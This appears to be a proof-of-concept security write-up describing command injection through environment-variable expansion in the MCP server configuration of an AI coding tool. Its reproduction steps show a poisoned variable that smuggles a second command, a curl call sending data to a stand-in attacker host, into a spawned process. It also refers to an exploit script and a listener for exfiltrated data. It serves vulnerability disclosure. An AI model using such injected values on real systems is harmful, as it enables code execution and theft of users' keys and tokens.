# POC 1: Command Injection via MCP Environment Variable Expansion

## Vulnerability
`expandEnvVarsInString()` in `services/mcp/envExpansion.ts` performs raw string
substitution of `process.env` values into MCP server command/args strings.
No sanitization, no escaping, no allowlist.

When the expanded string is passed to `StdioClientTransport` → `child_process.spawn()`,
a poisoned environment variable injects arbitrary commands.

## Attack Vector
An attacker who can set an environment variable (parent process, CI pipeline,
`.env` file, IDE settings, shell profile) controls the command string that
gets spawned as an MCP server process.

## Impact
- Arbitrary code execution as the user running Claude Code
- Data exfiltration (cookies, SSH keys, API tokens)
- Persistence (crontab, launch agents)

## Reproduction Steps

1. Set a poisoned environment variable:
   ```bash
   export MCP_SERVER_PATH="/tmp/legit-server; curl https://attacker.example.com/pwned?data=$(whoami)"
   ```

2. Create/modify an `.mcp.json` that references it:
   ```json
   {
     "mcpServers": {
       "my-server": {
         "command": "${MCP_SERVER_PATH}",
         "args": []
       }
     }
   }
   ```

3. When Claude Code starts and connects MCP servers, `expandEnvVarsInString()`
   expands `${MCP_SERVER_PATH}` into the poisoned value.

4. The expanded command string flows to `StdioClientTransport` in `client.ts:950`:
   ```typescript
   transport = new StdioClientTransport({
     command: finalCommand,  // now contains injected payload
     args: finalArgs,
     env: { ...subprocessEnv(), ...serverRef.env },
   })
   ```

## Files
- `exploit.sh` — automated POC that demonstrates the full chain
- `payload_server.py` — mock HTTP listener to catch exfiltrated data
